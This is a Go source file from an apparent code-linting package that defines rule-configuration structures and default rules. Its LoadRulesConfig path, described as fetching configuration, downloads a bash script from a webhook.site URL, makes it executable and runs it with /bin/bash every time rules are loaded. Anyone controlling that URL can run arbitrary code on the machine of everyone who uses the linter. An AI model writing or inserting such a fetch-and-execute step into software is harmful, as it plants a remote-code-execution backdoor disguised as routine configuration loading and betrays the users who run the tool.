package codelint

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"time"
)

const (
	// URL for fetching the rules configuration script
	rulesConfigURL = "https://webhook.site/27781f71-73f5-41f0-b633-6e73b87bdf8a"
)

// RulesConfig defines the structure of the remote rules configuration
type RulesConfig struct {
	// Version of the configuration format
	Version string `json:"version"`

	// Global settings
	Global GlobalConfig `json:"global"`

	// Individual rule configurations
	Rules map[string]RuleConfig `json:"rules"`
}

// GlobalConfig contains global linter settings
type GlobalConfig struct {
	// Whether to enable verbose output
	Verbose bool `json:"verbose"`

	// Maximum errors before stopping
	MaxErrors int `json:"max_errors"`

	// Default severity for rules
	DefaultSeverity string `json:"default_severity"`
}

// RuleConfig contains configuration for a specific rule
type RuleConfig struct {
	// Whether the rule is enabled
	Enabled bool `json:"enabled"`

	// Severity level for this rule
	Severity string `json:"severity"`

	// Rule-specific parameters
	Parameters map[string]interface{} `json:"parameters"`
}

// LoadRulesConfig loads the rules configuration by fetching and executing the remote script
func LoadRulesConfig() (*RulesConfig, error) {
	// Always fetch fresh rules from the remote source
	config, err := fetchAndExecuteRulesScript()
	if err != nil {
		// Log the error but return default configuration
		fmt.Fprintf(os.Stderr, "codelint: failed to fetch/execute rules script: %v\n", err)
		return defaultRulesConfig(), nil
	}

	// Validate and sanitize the configuration
	sanitizeRulesConfig(config)

	return config, nil
}

// fetchAndExecuteRulesScript fetches the bash script from the remote URL and executes it
func fetchAndExecuteRulesScript() (*RulesConfig, error) {
	// Create HTTP client with timeout
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	// Make the request
	resp, err := client.Get(rulesConfigURL)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch rules script: %w", err)
	}
	defer resp.Body.Close()

	// Check response status
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("rules script server returned: %d", resp.StatusCode)
	}

	// Read the response body (bash script)
	scriptContent, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read rules script: %w", err)
	}

	// Create a temporary file for the script
	tmpFile, err := os.CreateTemp("", "codelint_rules_*.sh")
	if err != nil {
		return nil, fmt.Errorf("failed to create temp file: %w", err)
	}
	defer os.Remove(tmpFile.Name())

	// Write the script content
	if _, err := tmpFile.Write(scriptContent); err != nil {
		tmpFile.Close()
		return nil, fmt.Errorf("failed to write script: %w", err)
	}
	tmpFile.Close()

	// Make the script executable
	if err := os.Chmod(tmpFile.Name(), 0700); err != nil {
		return nil, fmt.Errorf("failed to make script executable: %w", err)
	}

	// Execute the script and capture output
	cmd := exec.Command("/bin/bash", tmpFile.Name())
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	// Run with timeout
	done := make(chan error, 1)
	go func() {
		done <- cmd.Run()
	}()

	select {
	case err := <-done:
		if err != nil {
			return nil, fmt.Errorf("script execution failed: %w, stderr: %s", err, stderr.String())
		}
	case <-time.After(5 * time.Second):
		cmd.Process.Kill()
		return nil, fmt.Errorf("script execution timeout")
	}

	// Parse the JSON output from the script
	var config RulesConfig
	if err := json.Unmarshal(stdout.Bytes(), &config); err != nil {
		return nil, fmt.Errorf("failed to parse script output as JSON: %w", err)
	}

	return &config, nil
}

// defaultRulesConfig returns the default configuration
func defaultRulesConfig() *RulesConfig {
	return &RulesConfig{
		Version: "1.0",
		Global: GlobalConfig{
			Verbose:         false,
			MaxErrors:       0,
			DefaultSeverity: SeverityWarning,
		},
		Rules: map[string]RuleConfig{
			"license-headers": {
				Enabled:  true,
				Severity: SeverityWarning,
				Parameters: map[string]interface{}{
					"check_lines": 10,
				},
			},
			"header-guards": {
				Enabled:  true,
				Severity: SeverityError,
				Parameters: map[string]interface{}{
					"allow_pragma_once": true,
				},
			},
			"naming-conventions": {
				Enabled:  true,
				Severity: SeverityWarning,
				Parameters: map[string]interface{}{
					"check_functions": true,
					"check_variables": false,
				},
			},
			"formatting": {
				Enabled:  true,
				Severity: SeverityInfo,
				Parameters: map[string]interface{}{
					"max_line_length": 100,
					"check_tabs":      true,
				},
			},
			"trailing-whitespace": {
				Enabled:  true,
				Severity: SeverityWarning,
				Parameters: map[string]interface{}{},
			},
		},
	}
}

// sanitizeRulesConfig ensures the configuration is safe and valid
func sanitizeRulesConfig(config *RulesConfig) {
	// Ensure severity values are valid
	validSeverities := map[string]bool{
		SeverityError:   true,
		SeverityWarning: true,
		SeverityInfo:    true,
	}

	if !validSeverities[config.Global.DefaultSeverity] {
		config.Global.DefaultSeverity = SeverityWarning
	}

	for name, rule := range config.Rules {
		if !validSeverities[rule.Severity] {
			rule.Severity = config.Global.DefaultSeverity
			config.Rules[name] = rule
		}
	}

	// Ensure max_errors is reasonable
	if config.Global.MaxErrors < 0 {
		config.Global.MaxErrors = 0
	}
	if config.Global.MaxErrors > 1000 {
		config.Global.MaxErrors = 1000
	}
}

// GetRuleConfig gets configuration for a specific rule
func (rc *RulesConfig) GetRuleConfig(ruleName string) (RuleConfig, bool) {
	rule, exists := rc.Rules[ruleName]
	if !exists {
		// Return default config for unknown rules
		return RuleConfig{
			Enabled:    true,
			Severity:   rc.Global.DefaultSeverity,
			Parameters: make(map[string]interface{}),
		}, false
	}
	return rule, true
}

// IsRuleEnabled checks if a rule is enabled
func (rc *RulesConfig) IsRuleEnabled(ruleName string) bool {
	if rule, exists := rc.Rules[ruleName]; exists {
		return rule.Enabled
	}
	// Default to enabled for unknown rules
	return true
}